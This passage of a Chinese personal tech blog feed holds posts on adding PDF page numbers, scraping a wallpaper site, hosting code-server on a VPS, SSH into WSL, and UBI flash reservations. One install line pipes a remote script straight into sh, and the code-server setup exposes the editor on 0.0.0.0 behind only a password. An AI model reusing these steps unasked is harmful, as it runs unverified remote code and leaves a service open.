path = &#39;release_notes.pdf&#39;
tmp = &quot;tmp.pdf&quot;

dst_pdf = PdfFileWriter()
with open(path, &#39;rb&#39;) as f:
    src_pdf = PdfFileReader(f, strict=False)
    n = src_pdf.getNumPages()
    create_pdf_with_pagenumber(tmp, n)

    with open(tmp, &#39;rb&#39;) as ftmp:
        num_pdf = PdfFileReader(ftmp)
        for i in range(n):
            print(&#39;page: %d of %d&#39; % (i+1, n))
            page = src_pdf.getPage(i)
            num_layer = num_pdf.getPage(i)

            page.mergePage(num_layer)
            dst_pdf.addPage(page)

    if dst_pdf.getNumPages():
        output = &#39;{}_new.pdf&#39;.format(path.split(&#39;.&#39;)[0])
        with open(output, &#39;wb&#39;) as f:
            dst_pdf.write(f)

    os.remove(tmp)
</code></pre>
<h3 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h3><pre><code class="python">#!/usr/bin/env python3
# -*- coding: utf-8 -*-
&#39;&#39;&#39;add page number to pdf file&#39;&#39;&#39;

import sys
import os

import reportlab
from reportlab.lib.units import mm
from reportlab.pdfgen import canvas
from reportlab.pdfbase import pdfmetrics
from reportlab.pdfbase.ttfonts import TTFont

from PyPDF2 import PdfFileWriter, PdfFileReader


def create_pdf_with_pagenumber(tmp, num):
    &#39;&#39;&#39;create tmp pdf that only include page number&#39;&#39;&#39;
    pdfmetrics.registerFont(
        TTFont(&#39;Times-New-Roman&#39;, &#39;C:\\Windows\\Fonts\\times.ttf&#39;))
    c = canvas.Canvas(tmp)
    for i in range(num):
        c.setFont(&#39;Times-New-Roman&#39;, 10)
        c.drawString((104)*mm, (4)*mm, str(i + 1))
        c.showPage()
    c.save()


def main():
    path = &#39;release_notes.pdf&#39;
    if len(sys.argv) == 1:
        if not os.path.isfile(path):
            sys.exit(1)
    else:
        path = os.path.basename(sys.argv[1])

    tmp = &quot;tmp.pdf&quot;
    dst_pdf = PdfFileWriter()
    with open(path, &#39;rb&#39;) as f:
        src_pdf = PdfFileReader(f, strict=False)
        n = src_pdf.getNumPages()
        create_pdf_with_pagenumber(tmp, n)

        with open(tmp, &#39;rb&#39;) as ftmp:
            num_pdf = PdfFileReader(ftmp)
            for i in range(n):
                print(&#39;page: %d of %d&#39; % (i+1, n))
                page = src_pdf.getPage(i)
                num_layer = num_pdf.getPage(i)

                page.mergePage(num_layer)
                dst_pdf.addPage(page)

        if dst_pdf.getNumPages():
            output = &#39;{}_new.pdf&#39;.format(path.split(&#39;.&#39;)[0])
            with open(output, &#39;wb&#39;) as f:
                dst_pdf.write(f)

        os.remove(tmp)


if __name__ == &quot;__main__&quot;:
    main()
</code></pre>
<p>使用很简单</p>
<pre><code class="bash">python3 main.py filename.pdf
</code></pre>
<h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><ul>
<li><a href="https://gist.github.com/DIYer22/b9ede6b5b96109788a47973649645c1f" target="_blank" rel="noopener">https://gist.github.com/DIYer22/b9ede6b5b96109788a47973649645c1f</a></li>
<li><a href="https://www.reportlab.com/docs/reportlab-userguide.pdf" target="_blank" rel="noopener">ReportLab PDF Library User Guide.pdf</a></li>
</ul>
]]></content>
      
        <categories>
            
            <category> Python </category>
            
        </categories>
        
        
        <tags>
            
            <tag> pdf </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Python网络爬虫8 - 爬取彼岸图网美图]]></title>
      <url>https://www.litreily.top/2020/08/09/netbian/</url>
      <content type="html"><![CDATA[<p><a href="http://pic.netbian.com/" target="_blank" rel="noopener">彼岸图网</a>收集了大量美图，是个不错的爬取对象。话不多说，直接上图。</p>
<p><img src="/assets/netbian/netbian.png" alt="彼岸图网"></p>
<h2 id="分析站点"><a href="#分析站点" class="headerlink" title="分析站点"></a>分析站点</h2><h3 id="分类列表"><a href="#分类列表" class="headerlink" title="分类列表"></a>分类列表</h3><p>爬取之前，自然要分析一波，这个站点的框架比较简单，从分类着手，共包含12个分类项。</p>
<ol>
<li>4K人物</li>
<li>4K动漫</li>
<li>4K动物</li>
<li>4K宗教</li>
<li>4K影视</li>
<li>4K明星</li>
<li>4K汽车</li>
<li>4K游戏</li>
<li>4K美女</li>
<li>4K美食</li>
<li>4K背景</li>
<li>4K风景</li>
</ol>
<p>名称都含有4K，但是获取原图是需要会员的，所以我这里获取的不是原图，而是详细页展示的大图。首先要获取的当然是分类页面的网址，看下面的DOM.</p>
<p><img src="/assets/netbian/categories.png" alt="分类信息"></p>
<p>通过<code>xpath</code> <code>//div[contains(@class, &quot;classify&quot;)]/a</code> 可以得到分类链接信息，从而可以得到分类名称和网址。</p>
<h3 id="缩略图列表"><a href="#缩略图列表" class="headerlink" title="缩略图列表"></a>缩略图列表</h3><p>接下来以<code>4k影视</code>为例，解析每个分类页面，从分类页面可以看到图片的缩略图列表，点击缩略图就能进入详细页面看到大图。</p>
<p><img src="/assets/netbian/category.png" alt="4k影视"></p>
<p>缩略图列表中的图片链接可以通过<code>xpath</code> <code>//div[@class=&quot;slist&quot;]//a/@href</code> 获得。</p>
<p>此外，分类页面包含大量图片，是通过分页展示的，分页的页数可以从页面尾部看到。</p>
<p><img src="/assets/netbian/pages_num.png" alt="分类页面页码"></p>
<p>页面数量可以通过<code>xpath</code> <code>//span[@class=&quot;slh&quot;]/following-sibling::a[1]/text()</code>获得，也就是<code>...</code>后的同胞元素。</p>
<h3 id="大图页面"><a href="#大图页面" class="headerlink" title="大图页面"></a>大图页面</h3><p>最后就是通过缩略图访问的大图页面了，根据大图的<code>id</code>信息，其实际链接可以通过<code>xpath</code> <code>//*[@id=&quot;img&quot;]/img/@src</code>获得。</p>
<p><img src="/assets/netbian/image.png" alt="大图"></p>
<p>到此，整个网站已经分析完成。</p>
<h2 id="爬取方案"><a href="#爬取方案" class="headerlink" title="爬取方案"></a>爬取方案</h2><p>根据分析过程可以很容易想到爬取步骤：</p>
<ol>
<li>获取分类信息，包括名称和链接</li>
<li>根据分类链接爬取缩略图信息，逐页爬取</li>
<li>逐页爬取过程中，获取大图实际链接</li>
<li>下载大图到本地</li>
</ol>
<p>为了加速爬取过程，我们可以使用多进程，使用Python中的进程池<code>Pool</code>即可。</p>
<h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><p>下面通过代码进行实现，为了方便资源共享，减少全局变量或参数传递，我将爬虫封装成一个类<code>Netbian_Spider</code>. 将主页网址和爬虫所需的<code>UA</code>放到初始化信息中。</p>
<pre><code class="python">class Netbian_Spider(object):
    def __init__(self):
        self.index = &#39;http://pic.netbian.com&#39;
        self.headers = {
            &#39;user-agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36&#39;
        }
</code></pre>
<h3 id="函数定义"><a href="#函数定义" class="headerlink" title="函数定义"></a>函数定义</h3><p>在类中，可以先按爬取步骤定义好成员函数，当然在编码过程中可以依情况进行增删改。</p>
<pre><code class="python">    def get_path(self, name):
        pass

    def get_categories(self):
        &#39;&#39;&#39;get categories of website&#39;&#39;&#39;
        pass

    def spider_by_category(self, category, url):
        &#39;&#39;&#39;Process function which use to capture images base on category&#39;&#39;&#39;
        pass

    def parse_thumb_page(self, url, first_page=False):
        &#39;&#39;&#39;parse thumbnail page and get all the detail pages url&#39;&#39;&#39;
        pass

    def parse_detail_page(self, url):
        &#39;&#39;&#39;parse detail page and get source image url&#39;&#39;&#39;
        pass

    def download_image(self, url, path):
        pass
</code></pre>
<p>下面对爬虫的实现过程进行详细说明。</p>
<h3 id="保存路径"><a href="#保存路径" class="headerlink" title="保存路径"></a>保存路径</h3><p>首先确定图片的保存路径，根目录为<code>~/Pictures/python/netbian</code>，<code>windows</code>对应用户默认的图片目录，<code>linux</code>用户也是同样。</p>
<p>调用<code>get_path</code>会在根目录下会根据分类名称<code>name</code>新建子文件夹。</p>
<pre><code class="python">    def get_path(self, name):
        home_path = os.path.expanduser(&#39;~&#39;)
        path = os.path.join(home_path, &#39;Pictures/python/netbian/&#39; + name)
        if not os.path.isdir(path):
            os.makedirs(path)

        return os.path.realpath(path)
</code></pre>
<h3 id="获取分类信息"><a href="#获取分类信息" class="headerlink" title="获取分类信息"></a>获取分类信息</h3><p>按照前面的分类，爬虫第一步是爬取分类信息，我们使用<code>yield</code>定义一个<strong>生成器</strong>，逐个返回获取到的分类名称和分类网址。</p>
<pre><code class="python">    def get_categories(self):
        &#39;&#39;&#39;get categories of website&#39;&#39;&#39;
        res = requests.get(self.index, headers=self.headers)
        doc = html.fromstring(res.content)
        categories = doc.xpath(&#39;//div[contains(@class, &quot;classify&quot;)]/a&#39;)

        for category in categories:
            name = category.xpath(&#39;text()&#39;)[0]
            url = category.xpath(&#39;@href&#39;)[0]
            yield name, url
</code></pre>
<h3 id="按分类逐页爬取"><a href="#按分类逐页爬取" class="headerlink" title="按分类逐页爬取"></a>按分类逐页爬取</h3><p>得到分类页面<code>url</code>后，通过后续实现的<code>page_thumb_page</code>解析分类页面得到</p>
<ol>
<li>大图详细页面链接<code>detail_pages</code></li>
<li>每个分类的总页面数量<code>page_cnt</code></li>
</ol>
<p>之后就逐页爬取大图并下载到本地，直到所有页面都爬取完成。</p>
<pre><code class="python">    def spider_by_category(self, category, url):
        &#39;&#39;&#39;Process function which use to capture images base on category&#39;&#39;&#39;
        path_category = self.get_path(category)
        detail_pages, page_cnt = self.parse_thumb_page(url, first_page=True)

        img_cnt = 0
        page_num = 1
        while True:
            for page in detail_pages:
                img_cnt += 1

                print(&#39;[{} page-{} img-{}] Parsing page {}&#39;.format(
                    category, page_num, img_cnt, page))
                img_url = self.parse_detail_page(page)
                self.download_image(img_url, path_category)

            page_num += 1
            if page_num &gt; page_cnt:
                break
            detail_pages = self.parse_thumb_page(
                &#39;{}index_{}.html&#39;.format(url, page_num))
</code></pre>
<h3 id="解析缩略图"><a href="#解析缩略图" class="headerlink" title="解析缩略图"></a>解析缩略图</h3><p>在分类页面，也就是缩略图页面，通过前面提及的<code>xpath</code>可以得到所有缩略图对应大图的链接。此外，如果是当前分类的首页，还需要返回分页数。</p>
<pre><code class="python">    def parse_thumb_page(self, url, first_page=False):
        &#39;&#39;&#39;parse thumbnail page and get all the detail pages url&#39;&#39;&#39;
        res = requests.get(self.index + url, headers=self.headers)
        doc = html.fromstring(res.content)
        detail_pages = doc.xpath(&#39;//div[@class=&quot;slist&quot;]//a/@href&#39;)

        if first_page:
            page_cnt = doc.xpath(
                &#39;//span[@class=&quot;slh&quot;]/following-sibling::a[1]/text()&#39;)[0]
            return detail_pages, int(page_cnt)
        else:
            return detail_pages
</code></pre>
<h3 id="下载大图"><a href="#下载大图" class="headerlink" title="下载大图"></a>下载大图</h3><p>大图页面的解析也是一个<code>xpath</code>就搞定了，然后通过<code>requests</code>下载到本地指定路径就ok啦。</p>
<pre><code class="python">    def parse_detail_page(self, url):
        &#39;&#39;&#39;parse detail page and get source image url&#39;&#39;&#39;
        res = requests.get(self.index + url, headers=self.headers)
        doc = html.fromstring(res.content)
        img_url = doc.xpath(&#39;//*[@id=&quot;img&quot;]/img/@src&#39;)[0]

        return img_url

    def download_image(self, url, path):
        img_name = url.split(&#39;/&#39;)[-1]
        save_path = os.path.join(path, img_name)

        res = requests.get(self.index + url, headers=self.headers, timeout=20)
        if res.status_code == 200:
            with open(save_path, &#39;wb&#39;) as f:
                f.write(res.content)
</code></pre>
<h3 id="main函数"><a href="#main函数" class="headerlink" title="main函数"></a>main函数</h3><p>主函数用到的最关键的知识点就是进程池<code>Pool</code>，使用Pool创建多进程，进程数量由<code>multiprocessing.cpu_conut()</code>决定，也就是PC包含的CPU数量。</p>
<p>主函数首先创建<code>Netbian_Spider</code>类的对象<code>spider</code>，然后获取分类信息。进程池中，每个进程处理一个分类，共12个进程，每次最多执行<code>cpu_count()</code>个进程，剩下的需要前面至少一个执行结束才会开始。</p>
<pre><code class="python">def main():
    spider = Netbian_Spider()
    categories = spider.get_categories()

    p = Pool(cpu_count())
    for name, url in categories:
        p.apply_async(spider.spider_by_category, args=(name, url))

    p.close()
    p.join()
    print(&#39;All Done!&#39;)


if __name__ == &quot;__main__&quot;:
    main()
</code></pre>
<h2 id="爬取测试"><a href="#爬取测试" class="headerlink" title="爬取测试"></a>爬取测试</h2><p>使用<code>python3</code>爬取彼岸图网，共爬取图片17796张，9.18G</p>
<p><img src="/assets/netbian/captureing.png" alt="爬取测试"></p>
<p><img src="/assets/netbian/captured.png" alt="爬取结果"></p>
<h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><p>该爬虫源码已放置Github项目<a href="https://github.com/Litreily/capturer" target="_blank" rel="noopener">capturer</a>，欢迎交流。</p>
<p>此外，爬取图片仅供学习，不得商用哦。</p>
]]></content>
      
        <categories>
            
            <category> Python </category>
            
        </categories>
        
        
        <tags>
            
            <tag> spider </tag>
            
            <tag> xpath </tag>
            
            <tag> pool </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[VPS搭建在线VSCode Server]]></title>
      <url>https://www.litreily.top/2020/06/13/code-server/</url>
      <content type="html"><![CDATA[<h2 id="VSCode-Server"><a href="#VSCode-Server" class="headerlink" title="VSCode Server"></a>VSCode Server</h2><p>VSCode(Visual Studio Code), 是我目前使用过的最好的编辑器，也应该是很多程序员的首选。然而很多人不知道的是，这款开发利器还有在线版，这包括GitHub即将推出的<code>Satellite</code>, 也会搭载VSCode，那么如果我们想要搭建自己的在线开发环境呢？答案就是<a href="https://github.com/cdr/code-server" target="_blank" rel="noopener">Code Server</a>, 一款可以部署在个人服务器上的VSCode服务。</p>
<p><img src="/assets/vscode/pods-lg.png" alt="pods logo"></p>
<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>如果在本地，自然是无需搭建这个server的，我的选择是放在阿里云服务器上，对应的是Ubuntu系统，安装过程非常简单。</p>
<pre><code class="zsh">curl -fsSL https://code-server.dev/install.sh |sh
</code></pre>
<p>安装完会给出提示该怎么操作，其它系统可以参考<a href="https://github.com/cdr/code-server/blob/master/doc/guide.md" target="_blank" rel="noopener">官方文档</a>。</p>
<h3 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h3><p>使用<code>systemctl</code>启动服务，并保证系统重启可以自启动服务，可以执行以下指令：</p>
<pre><code class="zsh">systemctl --user enable --now code-server
</code></pre>
<h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>VSCode服务有一个配置文件<code>~/.config/code-server/config.yaml</code>，默认配置包含：</p>
<pre><code class="yaml">bind-addr: 127.0.0.1:8080
auth: password
password: somerandominfo
cert: false
</code></pre>
<p>默认情况下开启了密码认证，同时给了一个初始密码。我们可以将端口号和密码都修改成自己想要的。修改完成以后，记得重启服务。</p>
<pre><code class="zsh">systemctl --user restart code-server
</code></pre>
<h2 id="VPS安全组"><a href="#VPS安全组" class="headerlink" title="VPS安全组"></a>VPS安全组</h2><p>如果使用的是VPS，默认情况下是会将除ssh以外的其它端口都屏蔽的，所以我们需要在服务器的控制台修改安全组。</p>
<p><img src="/assets/vscode/vps-port.png" alt="VPS 安全组"></p>
<p>但是添加以后还是无法访问，后来谷歌后发现是配置问题，上面的<code>127.0.0.1</code>只是针对本地地址，无法被外部网络访问，因此，解决方案就是将<code>127.0.0.1</code>改为<code>0.0.0.0</code>，然后重启服务。</p>
<h2 id="实例展示"><a href="#实例展示" class="headerlink" title="实例展示"></a>实例展示</h2><p>通过配置好的端口访问VPS的Code Server，首先进入登录页面，输入配置的密码即可。</p>
<p><img src="/assets/vscode/code-login.png" alt="登录 Code Server"></p>
<p>好啦，基本和本地的一毛一样，目前尝试过程发现无法复制网页外的其它数据，终端无法使用<code>Ctrl-L</code>清空，算是小瑕疵吧，不过真的超棒，我想，针对需要出差的人群算是福音了。</p>
<p><img src="/assets/vscode/code-server.png" alt="Code Server"></p>
<p>首次运行会比较慢，当然可能是我的网速问题，加载一个大型<code>js</code>文件<code>workbench.web.api.js</code>占据了大量时间，在启用浏览器缓存的情况下，往后启动就更快了。</p>
<p>另外，如果有域名的话，可以按照官方教程安装<a href="https://github.com/cdr/code-server/blob/master/doc/guide.md#lets-encrypt" target="_blank" rel="noopener">Let&#39;s Encrypt.</a>证书，然后通过<code>https</code>访问，这样更加安全。</p>
]]></content>
      
        <categories>
            
            <category> Linux </category>
            
        </categories>
        
        
        <tags>
            
            <tag> ubuntu </tag>
            
            <tag> vps </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Win10中使用ssh访问WSL]]></title>
      <url>https://www.litreily.top/2020/05/08/putty-wsl/</url>
      <content type="html"><![CDATA[<p>win10的WSL作为目前日常必备，实在是爱不释手，奈何默认终端界面实在一言难尽，尽管配色问题可以解决，但是字体问题导致ohmyzsh的很多图标无法正常显示，配置好<a href="https://github.com/powerline/fonts" target="_blank" rel="noopener">powerline</a>字体略有改善，但配合tmux使用又会出现乱码问题，实在难以忍受，于是准备通过ssh间接访问。</p>
<h2 id="配置ssh"><a href="#配置ssh" class="headerlink" title="配置ssh"></a>配置ssh</h2><p>重装<code>openssh-server</code>, 如果自带的没问题也不用重装。</p>
<pre><code class="zsh">sudo apt remove openssh-server
sudo apt install openssh-server
</code></pre>
<p>修改<code>/etc/ssh/sshd_config</code></p>
<pre><code class="zsh"># 服务端每分钟发送一次数据包给客户端，客户端回复即保持连接
ClientAliveInterval 60
# 客户端3次未响应则断开
ClientAliveCountMax 3

# 开启密码认证，拒绝空密码
PasswordAuthentication yes
PermitEmptyPasswords no
</code></pre>
<p>手动启动ssh, 可以用以下方法，二选一</p>
<pre><code class="zsh">sudo service ssh start
sudo /etc/init.d/ssh start
</code></pre>
<h2 id="开机自启动"><a href="#开机自启动" class="headerlink" title="开机自启动"></a>开机自启动</h2><p>为了保证每次开机可以直接通过putty打开WSL，需要开机自启动ssh，怎么实现呢，参考知乎文章 <a href="https://zhuanlan.zhihu.com/p/47733615" target="_blank" rel="noopener">WSL 服务自动启动的正确方法</a> ，简单整理如下：</p>
<ul>
<li><code>Win R</code>运行<code>shell:startup</code>打开windows的自启动目录</li>
<li>添加脚本<code>wsl.vbs</code>, 输入以下信息然后保存文件</li>
</ul>
<pre><code class="vbs">Set ws = CreateObject(&quot;Wscript.Shell&quot;)
ws.run &quot;wsl -d ubuntu -u root /etc/init.d/ssh start&quot;, vbhide
</code></pre>
<h2 id="字体"><a href="#字体" class="headerlink" title="字体"></a>字体</h2><p>安装 <a href="https://github.com/tonsky/FiraCode" target="_blank" rel="noopener">Fira code</a> 字体，超46k的star，还是很强大的。安装后修改下putty和VSCode的字体。</p>
<ul>
<li>putty，打开settings，选择Window-&gt;Appearance-&gt;Font settings, 设置<code>Fira code</code>字体。</li>
<li>VSCode，打开settings，搜索&quot;font family&quot;，在已有字体中加入<code>Fira Code Retina</code>字体。</li>
</ul>
<p><img src="/assets/vscode/vscode-font.png" alt="VSCode Font family"></p>
<p>配置VSCode的原因是VSCode本身也可以使用WSL，所以字体方面也可以进行修正。</p>
<h2 id="putty"><a href="#putty" class="headerlink" title="putty"></a>putty</h2><p>putty除了配置字体外，还可以配置<code>Alt-Enter</code>全屏快捷键，当然最主要的还是配置连接WSL的ssh. 由于是本机，使用localhost或者<code>127.0.0.1</code>就可以。</p>
<p><img src="/assets/putty/putty-wsl.png" alt="putty wsl"></p>
<p>同时配置下默认用户名，可以免去每次打开时输入用户名的麻烦。</p>
<p><img src="/assets/putty/putty-data.png" alt="putty default user"></p>
<p>最后来看下连接后的效果</p>
<p><img src="/assets/putty/putty-tmux.png" alt="putty tmux"></p>
<p>好啦，完结撒花~</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://zhuanlan.zhihu.com/p/47733615" target="_blank" rel="noopener">WSL 服务自动启动的正确方法</a></li>
</ul>
]]></content>
      
        <categories>
            
            <category> Linux </category>
            
        </categories>
        
        
        <tags>
            
            <tag> ssh </tag>
            
            <tag> putty </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Linux 内核驱动解析 - UBI坏块预留大小]]></title>
      <url>https://www.litreily.top/2020/05/07/ubi-driver/</url>
      <content type="html"><![CDATA[<p>在处理ubifs相关bug的过程中，学习了ubi驱动对坏块保留分区的处理方式，在此记录一下。</p>
<p><img src="/assets/linux/ubi-reserved-maps.png" alt="ubi reserved mind maps"></p>
<h2 id="相关概念"><a href="#相关概念" class="headerlink" title="相关概念"></a>相关概念</h2><h3 id="mtd"><a href="#mtd" class="headerlink" title="mtd"></a>mtd</h3><p><strong>mtd</strong> 全称 memory technology device 内存技术设备，是用于访问内存设备(RAM, Flash)的Linux 子系统，在硬件层和用户空间之间提供抽象接口。</p>
<p>在嵌入式linux设备中的<code>/dev/</code>目录下有很多<code>/dev/mtdxx</code>文件，这些文件对应的就是内存设备。比如，嵌入式设备的Nand Flash被划分为多个分区，每个分区对应一个<code>/dev/mtdxx</code>文件。</p>
<p>如下所示，<code>/dev/mtd0</code>至<code>/dev/mtd10</code>对应uboot分区，<code>mtd21</code>对应固件分区，<code>mtd20</code>就是本文将要用到的数据分区。</p>
<pre><code class="sh">root:/dev# ls mtd* |grep -v block
mtd0        mtd16ro     mtd23ro     mtd30ro
mtd0ro      mtd17       mtd24       mtd31
mtd1        mtd17ro     mtd24ro     mtd31ro
mtd10       mtd18       mtd25       mtd3ro
mtd10ro     mtd18ro     mtd25ro     mtd4
mtd11       mtd19       mtd26       mtd4ro
mtd11ro     mtd19ro     mtd26ro     mtd5
mtd12       mtd1ro      mtd27       mtd5ro
mtd12ro     mtd2        mtd27ro     mtd6
mtd13       mtd20       mtd28       mtd6ro
mtd13ro     mtd20ro     mtd28ro     mtd7
mtd14       mtd21       mtd29       mtd7ro
mtd14ro     mtd21ro     mtd29ro     mtd8
mtd15       mtd22       mtd2ro      mtd8ro
mtd15ro     mtd22ro     mtd3        mtd9
mtd16       mtd23       mtd30       mtd9ro
root:/dev#
root:/dev# cat /proc/mtd
dev:    size   erasesize  name
mtd0: 00100000 00020000 &quot;0:SBL1&quot;
mtd1: 00100000 00020000 &quot;0:MIBIB&quot;
mtd2: 00100000 00020000 &quot;0:BOOTCONFIG&quot;
...
mtd7: 00080000 00020000 &quot;0:BOOTCONFIG1&quot;
mtd8: 00080000 00020000 &quot;0:APPSBLENV&quot;
mtd9: 00200000 00020000 &quot;0:APPSBL&quot;
mtd10: 00200000 00020000 &quot;0:APPSBL_1&quot;
mtd11: 00080000 00020000 &quot;0:ART&quot;
mtd12: 00080000 00020000 &quot;0:ART.bak&quot;
mtd13: 00100000 00020000 &quot;config&quot;
mtd14: 00080000 00020000 &quot;data1&quot;
mtd15: 00040000 00020000 &quot;data2&quot;
...
mtd20: 01e00000 00020000 &quot;mtddata&quot;
mtd21: 02800000 00020000 &quot;firmware&quot;
...
mtd25: 02780000 00020000 &quot;reserved&quot;
</code></pre>
<h3 id="ubi"><a href="#ubi" class="headerlink" title="ubi"></a>ubi</h3><p><strong>ubi</strong> 是Unsorted Block Image的简称，ubifs是Unsorted Block Image File System(无序区块镜像文件系统)的简称，构建于MTD之上，可操控大容量的Nand flash.</p>
<p>nand flash, mtd 和ubifs三者关系可以简述为：nand flash作为硬件设备，mtd介于硬件设备和用户层间提供抽象接口，ubifs是在mtd之上构建的文件系统，方便对nand flash进行数据读写。</p>
<p>ubi相关概念有:</p>
<ul>
<li>PEB: physical eraseblock, 物理擦除块，通常为128KB(131072 Bytes)</li>
<li>LEB: logical eraseblock, 逻辑擦除块，通常为124KB(126976 Bytes)</li>
</ul>
<blockquote>
<p><strong>UBI Headers</strong><br>UBI stores 2 small 64-byte headers at the beginning of each non-bad physical eraseblock:  </p>
<ul>
<li>erase counter header (or <strong>EC</strong> header) which contains the erase counter of the physical eraseblock (PEB) plus other information;</li>
<li>volume identifier header (or <strong>VID</strong> header) which stores the volume ID and the logical eraseblock (LEB) number to which this PEB belongs.</li>
</ul>
</blockquote>
<p>从字面意思也可以理解，LEB是逻辑块，PEB是物理块，实际上LEB包含于PEB，通常LEB会比PEB小4KB，其中2KB用于存储VID Headers, 另外2KB是偏移量，用于对齐。</p>
<h2 id="console-log"><a href="#console-log" class="headerlink" title="console log"></a>console log</h2><p>了解了相关概念，接下来从嵌入式设备的console log看看UBI相关的信息，依据log可以方便在用户空间或者内核空间搜索相关信息，定位到与之相关的代码。</p>
<h3 id="UBI-attach"><a href="#UBI-attach" class="headerlink" title="UBI attach"></a>UBI attach</h3><p>首先来看下嵌入式linux设备开机过程中UBI设备的加载信息</p>
<pre><code class="zsh">Info: init ubi volumes on mtddata raw partition
UBI: attaching mtd20 to ubi0
random: procd: uninitialized urandom read (4 bytes read, 60 bits of entropy available)
UBI: scanning is finished
UBI: attached mtd20 (name &quot;mtddata&quot;, size 30 MiB) to ubi0
UBI: PEB size: 131072 bytes (128 KiB), LEB size: 126976 bytes
UBI: min./max. I/O unit sizes: 2048/2048, sub-page size 2048
UBI: VID header offset: 2048 (aligned 2048), data offset: 4096
UBI: good PEBs: 240, bad PEBs: 0, corrupted PEBs: 0
UBI: user volume: 5, internal volumes: 1, max. volumes count: 128
UBI: max/mean erase counter: 2/1, WL threshold: 4096, image sequence number: 860068978
UBI: available PEBs: 3, total reserved PEBs: 237, PEBs reserved for bad PEB handling: 20
UBI: background thread &quot;ubi_bgt0d&quot; started, PID 115
UBI device number 0, total 240 LEBs (30474240 bytes, 29.1 MiB), available 3 LEBs (380928 bytes, 372.0 KiB), LEB size 126976 bytes (124.0 KiB)
Info: attach ubi device on mtddata success!
</code></pre>
<p>以上信息绝大部分在内核UBI驱动的<code>build.c/ubi_attach_mtd_dev</code>函数中打印输出，下面内核空间部分会讲到。</p>
<p>下面分析其中几条主要信息：</p>
<pre><code class="zsh"># 在 mtddata 原始分区初始化 ubi 卷
Info: init ubi volumes on mtddata raw partition
# 将mtd20附加到ubi0...
UBI: attaching mtd20 to ubi0
# 将mtd20附加到ubi0 完成
UBI: attached mtd20 (name &quot;mtddata&quot;, size 30 MiB) to ubi0
# PEB 128KB, LEB 124KB
UBI: PEB size: 131072 bytes (128 KiB), LEB size: 126976 bytes
# 最小最大I/O读写单元：2048/2048, subpage 2048, 就是2KB
UBI: min./max. I/O unit sizes: 2048/2048, sub-page size 2048
# VID header偏移量2KB，用于对齐，数据偏移量4KB
UBI: VID header offset: 2048 (aligned 2048), data offset: 4096
# 240 pebs正常，无坏块
UBI: good PEBs: 240, bad PEBs: 0, corrupted PEBs: 0
# 剩余可用3 PEBs, 总保留 237 PEBs(已用或保留)，用于坏块处理的保留PEBs 20（本文讨论重点）
UBI: available PEBs: 3, total reserved PEBs: 237, PEBs reserved for bad PEB handling: 20
# UBI 设备号0，共240 LEBs（29.1MB)，剩余可用3 LEBs，每个LEB大小为124KB
UBI device number 0, total 240 LEBs (30474240 bytes, 29.1 MiB), available 3 LEBs (380928 bytes, 372.0 KiB), LEB size 126976 bytes (124.0 KiB)
# 成功在mtddata附加ubi设备
Info: attach ubi device on mtddata success!
</code></pre>
<p>从log中可以知晓很多关键信息，UBI挂载的分区名称为mtddata，对应mtd20; PEB 128KB， LEB 124KB; ubi0共240 LEBs/PEBs, 剩余可以3 LEBs/PEBs, 无坏块; 用于坏块处理的保留部分为20 PEBs, 本文后续将要介绍的就是这个保留20 PEBs是如何得来的。</p>
<h3 id="ubinfo-a"><a href="#ubinfo-a" class="headerlink" title="ubinfo -a"></a>ubinfo -a</h3><p>开机过程会自动打印UBI的信息，那开机后如何手动获取呢，这就要用到ubi相关的工具集了，ubi相关的指令包含：</p>
<pre><code class="zsh">root:/# ubi
ubiattach     ubidetach     ubinfo        ubirmvol
ubiblock      ubiformat     ubinize       ubirsvol
ubicrc32      ubimkvol      ubirename     ubiupdatevol
</code></pre>
<p>其中的<code>ubinfo</code>就可以查看ubi信息</p>
<pre><code class="sh">root:/# ubinfo -a
UBI version:                    1
Count of UBI devices:           1
UBI control device major/minor: 10:60
Present UBI devices:            ubi0

ubi0
Volumes count:                           5
Logical eraseblock size:                 126976 bytes, 124.0 KiB
Total amount of logical eraseblocks:     240 (30474240 bytes, 29.1 MiB)
Amount of available logical eraseblocks: 3 (380928 bytes, 372.0 KiB)
Maximum count of volumes                 128
Count of bad physical eraseblocks:       0
Count of reserved physical eraseblocks:  20
Current maximum erase counter value:     2
Minimum input/output unit size:          2048 bytes
Character device major/minor:            249:0
Present volumes:                         0, 1, 2, 3, 4
...
</code></pre>
<p>ubi0包含5个分卷，最多可包含128个分卷，其它基本信息与开机过程中内核打印的信息一致，本文主要关心下面这一条信息。</p>
<pre><code class="sh">Count of reserved physical eraseblocks:  20
</code></pre>
<p>好啦，到此就获取并分析了最直观的log信息，下面将从用户空间和内核空间两个维度来追溯这个20 PEBs是怎么来的。</p>
<h2 id="用户空间"><a href="#用户空间" class="headerlink" title="用户空间"></a>用户空间</h2><p>在用户空间的ubi-utils代码库中搜索“Count of reserved physical eraseblocks”，就可以定位到函数<code>ubinfo.c/print_dev_info</code></p>
<h3 id="print-dev-info"><a href="#print-dev-info" class="headerlink" title="print_dev_info"></a>print_dev_info</h3><pre><code class="c">static int print_dev_info(libubi_t libubi, int dev_num, int all)
{
    int i, err, first = 1;
    struct ubi_dev_info dev_info;
    struct ubi_vol_info vol_info;

    err = ubi_get_dev_info1(libubi, dev_num, &amp;dev_info);
    if (err)
        return sys_errmsg(&quot;cannot get information about UBI device %d&quot;, dev_num);

    printf(&quot;ubi%d\n&quot;, dev_info.dev_num);
    printf(&quot;Volumes count:                           %d\n&quot;, dev_info.vol_count);
    printf(&quot;Logical eraseblock size:                 &quot;);
    util_print_bytes(dev_info.leb_size, 0);
